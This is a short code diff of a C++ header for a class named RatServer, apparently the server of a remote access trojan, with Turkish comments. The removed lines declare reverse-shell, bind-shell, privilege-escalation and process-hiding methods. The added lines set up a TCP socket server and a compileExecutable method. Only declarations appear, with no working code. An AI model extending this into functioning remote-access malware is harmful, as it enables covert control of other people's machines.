@@ -8,23 +8,28 @@
 
 class RatServer{
 private:
-    TEM_TARGET_OS targetOs;    
-    
-    std::vector<std::vector<char*>> interfaceIPV4;
-    std::string ratIP;
+    uint rsPortNo;
+  
+    struct sockaddr_in *ratServerConfig;
 
-    uint ratPort;
+    csock *rs;
+    std::string rsIPAddr;
 
-
+    CSOCK_INIT init_rsIPV;
+    CSOCK_INIT init_rsProtocol;
    
 public:
-    RatServer(uint ratPort,const char *ratIP,TEM_TARGET_OS targetOs); //rat serveri baslatir
-    
-    bool temReverseShell();                                           //reverse shell baslatir
-    bool temBindShell();                            //bind shell portuna baglanir
+    RatServer(uint rsPortNo,const std::string rsIPAddr,
+              CSOCK_INIT ipv4_v6=IPV4, CSOCK_INIT tcp_udp = TCP , bool threaded = true,bool serverInputed = true);
+              //tcp_ipv4 server baslatma
+   
+    bool compileExecutable();
+            
+    ~RatServer();
 
-    bool temPrivilegeEscalation();                  //yetki yukseltme
-    bool temMigrateProcess();                       //processi saklama
+
+    
+
 
     
 };
